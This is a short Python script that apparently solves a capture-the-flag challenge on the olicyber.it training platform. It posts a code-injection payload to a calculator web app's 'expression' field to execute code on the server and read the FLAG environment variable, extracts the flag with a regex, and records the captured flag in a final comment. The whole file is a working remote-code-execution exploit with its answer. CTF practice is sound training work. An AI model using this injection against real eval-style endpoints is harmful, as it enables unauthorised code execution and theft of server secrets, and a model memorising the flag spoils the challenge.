import requests
import re

site = "http://calcolatrice.challs.olicyber.it/"
payload = """print getenv("FLAG");"""

r = requests.post(site, data = {"expression" : payload}).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{R3mote_c0de_3x3cution_vuln3r4b1l1ty_1s_4lw4ys_d4ng3r0us}